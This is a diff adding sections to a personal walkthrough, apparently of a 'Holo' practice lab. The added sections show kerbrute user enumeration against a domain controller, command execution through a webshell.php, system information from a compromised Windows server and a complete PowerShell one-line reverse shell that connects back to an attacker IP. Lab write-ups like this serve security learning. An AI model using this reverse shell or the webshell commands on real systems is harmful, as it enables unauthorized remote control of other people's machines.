@@ -283,6 +283,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 14.24 seconds
 ```
 
+```
+kerbrute userenum -d holo.live --dc 10.201.11.30 userlist.txt -t 100
+```
+![[Pasted image 20240823165711.png]]
+
 
 While getting the usernames aka valid usernames i decided to peak into the other websites and guess what  
 So i have to open all the sites to check what we get 
@@ -296,9 +301,102 @@ Let's ding into it some more.
 
 So we have 2 options see this (i.e. sql injection and directory bursting)
 
+![[Pasted image 20240823163137.png]]
+
 ```
 http://10.201.11.31/images/webshell.php?cmd=hostname
 ```
 ![[Pasted image 20240823162515.png]]
 
-Let's see if we can get the rev-shell
+Let's see if we can get info to see the whether it's windows or Linux so that i can escalate further.
+```
+nt authority\system
+S-SRV01
+```
+
+```
+Host Name:                 S-SRV01
+OS Name:                   Microsoft Windows Server 2019 Datacenter
+OS Version:                10.0.17763 N/A Build 17763
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Member Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          EC2
+Registered Organization:   Amazon.com
+Product ID:                00430-00000-00000-AA133
+Original Install Date:     10/22/2020, 2:58:22 PM
+System Boot Time:          8/23/2024, 5:21:12 AM
+System Manufacturer:       Xen
+System Model:              HVM domU
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
+BIOS Version:              Xen 4.11.amazon, 8/24/2006
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC) Coordinated Universal Time
+Total Physical Memory:     2,048 MB
+Available Physical Memory: 1,147 MB
+Virtual Memory: Max Size:  2,432 MB
+Virtual Memory: Available: 1,452 MB
+Virtual Memory: In Use:    980 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    holo.live
+Logon Server:              N/A
+Hotfix(s):                 21 Hotfix(s) Installed.
+                           [01]: KB4578966
+                           [02]: KB4470502
+                           [03]: KB4470788
+                           [04]: KB4480056
+                           [05]: KB4493510
+                           [06]: KB4494174
+                           [07]: KB4499728
+                           [08]: KB4504369
+                           [09]: KB4512577
+                           [10]: KB4512937
+                           [11]: KB4521862
+                           [12]: KB4523204
+                           [13]: KB4539571
+                           [14]: KB4549947
+                           [15]: KB4558997
+                           [16]: KB4562562
+                           [17]: KB4566424
+                           [18]: KB4570332
+                           [19]: KB4577667
+                           [20]: KB4580325
+                           [21]: KB4577668
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: AWS PV Network Device
+                                 Connection Name: Ethernet
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.201.11.1
+                                 IP address(es)
+                                 [01]: 10.201.11.31
+                                 [02]: fe80::30bd:90ac:637b:18dc
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+```
+
+![[Pasted image 20240823164339.png]]
+
+```
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.51.9.13',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+Tried to get the rev-shell and here we are
+![[Pasted image 20240823165205.png]]
+
+
+Let's try to escalate from here.
+
+## Users
+```
+Administrator                                                         
+holo                                                                  
+Public                                                                
+watamet                                                               
+WEB-MGR   
+```
+
